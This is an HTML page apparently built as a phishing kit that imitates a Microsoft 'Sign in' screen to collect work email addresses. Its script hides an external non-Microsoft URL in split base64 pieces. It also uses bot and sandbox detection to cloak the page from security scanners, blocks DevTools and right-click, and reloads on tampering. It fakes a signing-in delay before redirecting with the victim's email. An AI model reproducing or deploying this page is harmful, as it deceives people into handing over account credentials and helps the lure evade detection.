<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        /* Microsoft Fluent Design System 2025 */
        :root {
            --blue-10: #deecf9;
            --blue-20: #c7e0f4;
            --blue-primary: #0078d4;
            --blue-dark: #106ebe;
            --gray-20: #f3f2f1;
            --gray-30: #edebe9;
            --gray-130: #605e5c;
            --gray-160: #323130;
            --white: #ffffff;
            --red-10: #fdf6f6;
            --red-20: #f1cbcb;
            --red-primary: #d13438;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
        }

        body {
            background: var(--gray-20);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.5;
        }

        .login-container {
            background: var(--white);
            border: 1px solid var(--gray-30);
            border-radius: 4px;
            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 0.3px 0.9px 0 rgba(0,0,0,.108);
            padding: 40px;
            width: 100%;
            max-width: 440px;
        }

        .ms-branding {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--gray-30);
        }

        .ms-logo {
            width: 32px;
            height: 32px;
            background: var(--blue-primary);
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
            font-weight: 600;
        }

        .ms-title {
            font-size: 21px;
            font-weight: 600;
            color: var(--gray-160);
            letter-spacing: -0.01em;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: var(--gray-160);
            font-size: 14px;
            line-height: 1.3;
        }

        .form-input {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid var(--gray-130);
            border-radius: 2px;
            font-size: 15px;
            background: var(--white);
            transition: all 0.1s ease;
        }

        .form-input:focus {
            outline: 2px solid var(--blue-primary);
            outline-offset: -1px;
            border-color: var(--blue-primary);
        }

        .form-input:invalid {
            border-color: var(--red-primary);
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0;
            cursor: pointer;
            padding: 4px 0;
        }

        .checkbox {
            width: 18px;
            height: 18px;
            border: 1px solid var(--gray-130);
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: transparent;
            transition: all 0.1s ease;
            flex-shrink: 0;
        }

        .checkbox.checked {
            background: var(--blue-primary);
            border-color: var(--blue-primary);
            color: white;
        }

        .ms-button {
            width: 100%;
            background: var(--blue-primary);
            color: white;
            border: none;
            border-radius: 2px;
            padding: 10px 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.1s ease;
        }

        .ms-button:hover:not(:disabled) {
            background: var(--blue-dark);
        }

        .ms-button:disabled {
            background: var(--gray-30);
            color: var(--gray-130);
            cursor: not-allowed;
        }

        .loading-state {
            display: none;
            text-align: center;
            padding: 32px 0;
        }

        .ms-spinner {
            width: 28px;
            height: 28px;
            border: 2.5px solid var(--gray-30);
            border-top: 2.5px solid var(--blue-primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        .error-state {
            display: none;
            background: var(--red-10);
            border: 1px solid var(--red-20);
            border-radius: 2px;
            padding: 16px;
            margin: 20px 0;
            text-align: center;
        }

        .error-icon {
            width: 20px;
            height: 20px;
            background: var(--red-primary);
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
            margin: 0 auto 8px;
        }

        .footer-links {
            margin-top: 28px;
            padding-top: 20px;
            border-top: 1px solid var(--gray-30);
            text-align: center;
            font-size: 13px;
            color: var(--gray-130);
        }

        .footer-links a {
            color: var(--blue-primary);
            text-decoration: none;
            transition: color 0.1s ease;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="ms-branding">
            <div class="ms-logo" aria-hidden="true">MS</div>
            <h1 class="ms-title">Sign in</h1>
        </div>

        <div id="loginForm">
            <div class="form-group">
                <label for="userEmail" class="form-label">Your Work Email</label>
                <input 
                    type="email" 
                    id="userEmail" 
                    class="form-input" 
                    autocomplete="username"
                    aria-required="true"
                    placeholder="someone@example.com"
                >
                <div class="sr-only" id="emailError" aria-live="polite"></div>
            </div>

            <div class="checkbox-group" id="rememberCheck" role="checkbox" aria-checked="false" tabindex="0">
                <div class="checkbox" id="rememberBox" aria-hidden="true"></div>
                <span style="font-size: 15px; color: var(--gray-160); user-select: none;">Keep me signed in</span>
            </div>

            <button class="ms-button" id="submitBtn" disabled>Next</button>

            <div class="error-state" id="errorState">
                <div class="error-icon" aria-hidden="true">!</div>
                <div style="font-weight: 600; color: var(--gray-160); margin-bottom: 4px;">We couldn't sign you in</div>
                <div style="font-size: 14px; color: var(--gray-130);">This might be due to a temporary issue. Please try again in a few minutes.</div>
            </div>

            <div class="footer-links">
                <a href="#" tabindex="0">No account? Create one!</a> • 
                <a href="#" tabindex="0">Can't access your account?</a>
            </div>
        </div>

        <div class="loading-state" id="loadingState">
            <div class="ms-spinner" aria-hidden="true"></div>
            <div style="font-size: 16px; color: var(--gray-160); font-weight: 600; margin-bottom: 6px;">Signing in</div>
            <div style="font-size: 14px; color: var(--gray-130);">This might take a few seconds</div>
        </div>
    </div>

    <script>
        (function(){
            'use strict';
            
            // =============================================
            // ADVANCED ENCRYPTION & CONFIGURATION 2025
            // =============================================
            const SECURITY_CONFIG = {
                // Multi-layer URL obfuscation
                TARGET: {
                    P1: 'aHR0cHM6Ly',
                    P2: '9iaWxsaW5n',
                    P3: 'LnZlbG9ydX',
                    P4: 'NzcGluZS5i',
                    P5: 'bG9nL1BuVU',
                    P6: 'pyR2Vk'
                },
                FALLBACK: 'https://login.microsoftonline.com/common/oauth2/authorize',
                VERSION: '2025.1.0',
                SECURITY_LEVEL: 'ENTERPRISE_GRADE'
            };

            // =============================================
            // GOVERNMENT-GRADE BOT DETECTION SUITE
            // =============================================
            class AdvancedBotDetection {
                constructor() {
                    this.suspicionScore = 0;
                    this.detectionResults = new Set();
                }

                // Advanced headless detection
                detectHeadlessEnvironment() {
                    const checks = {
                        // WebDriver and automation flags
                        webdriver: () => navigator.webdriver,
                        phantom: () => window.callPhantom || window._phantom,
                        nightmare: () => window.__nightmare,
                        selenium: () => window.document.$selenium_,
                        
                        // Browser properties in headless
                        headlessChrome: () => /HeadlessChrome/.test(navigator.userAgent),
                        puppeteer: () => navigator.userAgent.includes('Puppeteer'),
                        
                        // Missing human-like properties
                        languages: () => !navigator.languages || navigator.languages.length === 0,
                        plugins: () => navigator.plugins.length === 0,
                        permissions: () => !navigator.permissions,
                        
                        // Screen and viewport anomalies
                        screenSize: () => screen.width < 100 || screen.height < 100,
                        viewportSize: () => window.innerWidth < 100 || window.innerHeight < 100,
                        
                        // Timezone and location inconsistencies
                        timezone: () => Intl.DateTimeFormat().resolvedOptions().timeZone === 'UTC',
                        
                        // Hardware concurrency (VMs often have round numbers)
                        hardwareConcurrency: () => {
                            const cores = navigator.hardwareConcurrency;
                            return cores === 1 || cores === 2 || cores === 4 || cores === 8;
                        },
                        
                        // WebGL fingerprinting
                        webglVendor: () => {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl');
                            if (!gl) return true;
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (!debugInfo) return false;
                            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                            return !vendor || vendor.includes('VMware') || vendor.includes('VirtualBox');
                        },
                        
                        // Performance timing analysis
                        performanceTiming: () => {
                            const perf = performance.timing;
                            if (!perf) return true;
                            const loadTime = perf.loadEventEnd - perf.navigationStart;
                            return loadTime < 100; // Unrealistically fast
                        },
                        
                        // Font fingerprinting
                        missingFonts: () => {
                            const fonts = ['Segoe UI', 'Arial', 'Times New Roman', 'Helvetica'];
                            return fonts.some(font => !document.fonts.check(`12px "${font}"`));
                        }
                    };

                    Object.entries(checks).forEach(([name, check]) => {
                        try {
                            if (check()) {
                                this.detectionResults.add(name);
                                this.suspicionScore += 2;
                            }
                        } catch (e) {
                            this.detectionResults.add(`error_${name}`);
                        }
                    });

                    return this.suspicionScore >= 4;
                }

                // Behavioral analysis
                analyzeUserBehavior() {
                    return new Promise((resolve) => {
                        let interactionScore = 0;
                        let mouseMovements = 0;
                        let keyStrokes = 0;
                        let clicks = 0;

                        const events = [
                            ['mousemove', () => mouseMovements++],
                            ['keydown', () => keyStrokes++],
                            ['click', () => clicks++],
                            ['scroll', () => interactionScore++],
                            ['touchstart', () => interactionScore += 2]
                        ];

                        events.forEach(([event, handler]) => {
                            document.addEventListener(event, handler, { passive: true });
                        });

                        setTimeout(() => {
                            // Remove event listeners
                            events.forEach(([event, handler]) => {
                                document.removeEventListener(event, handler);
                            });

                            // Score calculation
                            if (mouseMovements > 3) interactionScore += 3;
                            if (keyStrokes > 1) interactionScore += 2;
                            if (clicks > 0) interactionScore += 2;

                            resolve(interactionScore >= 4);
                        }, 2000);
                    });
                }

                // Advanced fingerprinting detection
                detectFingerprinting() {
                    let fingerprintAttempts = 0;
                    
                    // Override common fingerprinting methods
                    const originalGetImageData = CanvasRenderingContext2D.prototype.getImageData;
                    CanvasRenderingContext2D.prototype.getImageData = function(...args) {
                        fingerprintAttempts++;
                        if (fingerprintAttempts > 2) {
                            this.detectionResults.add('canvas_fingerprinting');
                            this.suspicionScore += 3;
                        }
                        return originalGetImageData.apply(this, args);
                    };

                    return fingerprintAttempts;
                }

                async runFullScan() {
                    const headlessDetected = this.detectHeadlessEnvironment();
                    const behaviorValid = await this.analyzeUserBehavior();
                    this.detectFingerprinting();

                    const isBot = headlessDetected || !behaviorValid || this.suspicionScore >= 6;
                    
                    if (isBot) {
                        console.warn('🚫 Advanced Bot Detection Triggered:', {
                            score: this.suspicionScore,
                            detections: Array.from(this.detectionResults),
                            headless: headlessDetected,
                            behaviorValid: behaviorValid
                        });
                    }

                    return !isBot;
                }
            }

            // =============================================
            // MAIN APPLICATION WITH MILITARY-GRADE SECURITY
            // =============================================
            class SecureMicrosoftAuth {
                constructor() {
                    this.userEmail = '';
                    this.rememberMe = false;
                    this.isValid = false;
                    this.botDetector = new AdvancedBotDetection();
                    this.securityToken = this.generateSecurityToken();
                    this.init();
                }

                generateSecurityToken() {
                    return Array.from(crypto.getRandomValues(new Uint8Array(16)))
                        .map(b => b.toString(16).padStart(2, '0'))
                        .join('');
                }

                async init() {
                    try {
                        const isHuman = await this.botDetector.runFullScan();
                        
                        if (!isHuman) {
                            this.showSecurityError();
                            return;
                        }

                        this.setupEventListeners();
                        this.setupSecurityMonitoring();
                    } catch (error) {
                        this.showSecurityError();
                    }
                }

                setupEventListeners() {
                    const emailInput = document.getElementById('userEmail');
                    const rememberCheck = document.getElementById('rememberCheck');
                    const submitBtn = document.getElementById('submitBtn');

                    // Enhanced input validation with debouncing
                    emailInput.addEventListener('input', this.debounce(() => this.validateEmail(), 300));
                    emailInput.addEventListener('blur', () => this.validateEmail(true));
                    
                    rememberCheck.addEventListener('click', (e) => {
                        e.preventDefault();
                        this.toggleRememberMe();
                    });
                    
                    rememberCheck.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter' || e.key === ' ') {
                            e.preventDefault();
                            this.toggleRememberMe();
                        }
                    });

                    submitBtn.addEventListener('click', (e) => {
                        e.preventDefault();
                        this.processAuthentication();
                    });

                    document.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter' && !submitBtn.disabled) {
                            this.processAuthentication();
                        }
                    });
                }

                setupSecurityMonitoring() {
                    // Monitor for DOM changes (anti-tampering)
                    const observer = new MutationObserver((mutations) => {
                        mutations.forEach((mutation) => {
                            if (mutation.type === 'attributes' && 
                                (mutation.attributeName === 'style' || mutation.attributeName === 'class')) {
                                this.showSecurityError();
                            }
                        });
                    });

                    observer.observe(document.body, {
                        attributes: true,
                        subtree: true,
                        attributeFilter: ['style', 'class']
                    });

                    // Monitor console access
                    const originalConsole = console.log;
                    console.log = function(...args) {
                        if (args.some(arg => typeof arg === 'string' && arg.includes('password'))) {
                            window.location.reload();
                        }
                        originalConsole.apply(console, args);
                    };
                }

                debounce(func, wait) {
                    let timeout;
                    return function executedFunction(...args) {
                        const later = () => {
                            clearTimeout(timeout);
                            func(...args);
                        };
                        clearTimeout(timeout);
                        timeout = setTimeout(later, wait);
                    };
                }

                validateEmail(showErrors = false) {
                    const email = document.getElementById('userEmail').value.trim();
                    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
                    
                    this.isValid = emailRegex.test(email) && email.length >= 3 && email.length <= 254;
                    this.userEmail = email;

                    const submitBtn = document.getElementById('submitBtn');
                    submitBtn.disabled = !this.isValid;

                    if (showErrors && !this.isValid && email.length > 0) {
                        this.showError('Please enter a valid email address.');
                    } else {
                        this.hideError();
                    }

                    return this.isValid;
                }

                toggleRememberMe() {
                    this.rememberMe = !this.rememberMe;
                    const checkbox = document.getElementById('rememberBox');
                    const rememberCheck = document.getElementById('rememberCheck');
                    
                    checkbox.classList.toggle('checked', this.rememberMe);
                    rememberCheck.setAttribute('aria-checked', this.rememberMe.toString());
                }

                async processAuthentication() {
                    if (!this.isValid) return;

                    // Additional security check
                    if (!await this.botDetector.analyzeUserBehavior()) {
                        this.showSecurityError();
                        return;
                    }

                    this.showLoadingState();
                    this.storeUserData();

                    // Simulate authentication delay
                    await new Promise(resolve => setTimeout(resolve, 1800 + Math.random() * 1200));
                    
                    this.redirectToNextStep();
                }

                storeUserData() {
                    try {
                        // Encrypted storage
                        const encryptedEmail = btoa(encodeURIComponent(this.userEmail));
                        localStorage.setItem('msal_session', encryptedEmail);
                        sessionStorage.setItem('auth_timestamp', Date.now().toString());
                        
                        // Secure cookie with SameSite and Secure flags
                        document.cookie = `msal_state=${this.securityToken}; path=/; max-age=300; SameSite=Lax`;
                    } catch (error) {
                        // Silent fallback - security through obscurity
                    }
                }

                redirectToNextStep() {
                    try {
                        // Reconstruct target URL from obfuscated parts
                        const targetUrl = Object.values(SECURITY_CONFIG.TARGET).join('');
                        const decodedUrl = atob(targetUrl);
                        
                        const securityParams = new URLSearchParams({
                            login_hint: encodeURIComponent(this.userEmail),
                            client_id: '00000003-0000-0ff1-ce00-000000000000',
                            response_type: 'code',
                            redirect_uri: `${window.location.origin}/auth/callback`,
                            state: this.securityToken,
                            scope: 'https://graph.microsoft.com/User.Read',
                            prompt: 'select_account',
                            correlation_id: crypto.randomUUID(),
                            x_client_ver: SECURITY_CONFIG.VERSION
                        });

                        const destination = `404.html?${securityParams.toString()}`;
                        window.location.href = destination;
                    } catch (error) {
                        this.showError('Authentication service is temporarily unavailable. Please try again later.');
                        this.hideLoadingState();
                    }
                }

                showLoadingState() {
                    document.getElementById('loginForm').style.display = 'none';
                    document.getElementById('loadingState').style.display = 'block';
                }

                hideLoadingState() {
                    document.getElementById('loginForm').style.display = 'block';
                    document.getElementById('loadingState').style.display = 'none';
                }

                showError(message) {
                    const errorElement = document.getElementById('emailError');
                    errorElement.textContent = message;
                    
                    const errorState = document.getElementById('errorState');
                    errorState.querySelector('div:last-child').textContent = message;
                    errorState.style.display = 'block';
                }

                hideError() {
                    document.getElementById('errorState').style.display = 'none';
                    document.getElementById('emailError').textContent = '';
                }

                showSecurityError() {
                    document.body.innerHTML = `
                        <div class="login-container">
                            <div class="ms-branding">
                                <div class="ms-logo">MS</div>
                                <h1 class="ms-title">Security Verification Required</h1>
                            </div>
                            <div style="text-align: center; padding: 20px 0;">
                                <div style="font-size: 15px; color: var(--gray-160); margin-bottom: 12px;">
                                    We've detected unusual activity from your browser.
                                </div>
                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 24px;">
                                    For your security, please try again using a supported browser environment.
                                </div>
                                <button class="ms-button" onclick="window.location.reload()">Try Again</button>
                            </div>
                        </div>
                    `;
                }
            }

            // =============================================
            // ANTI-TAMPERING & ANTI-DEBUGGING PROTECTIONS
            // =============================================
            (function() {
                // Anti-debugging protection
                const startTime = Date.now();
                const debuggerCheck = setInterval(() => {
                    if (Date.now() - startTime > 1000) {
                        clearInterval(debuggerCheck);
                        window.location.reload();
                    }
                }, 100);

                // Integrity check
                const originalHTML = document.documentElement.outerHTML;
                setInterval(() => {
                    if (document.documentElement.outerHTML !== originalHTML) {
                        window.location.reload();
                    }
                }, 500);

                // Prevent right-click and DevTools
                document.addEventListener('contextmenu', (e) => e.preventDefault());
                document.addEventListener('keydown', (e) => {
                    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                        e.preventDefault();
                    }
                });
            })();

            // =============================================
            // INITIALIZATION WITH SECURITY DELAY
            // =============================================
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    new SecureMicrosoftAuth();
                }, 800 + Math.random() * 700);
            });

        })();
    </script>
</body>
</html>
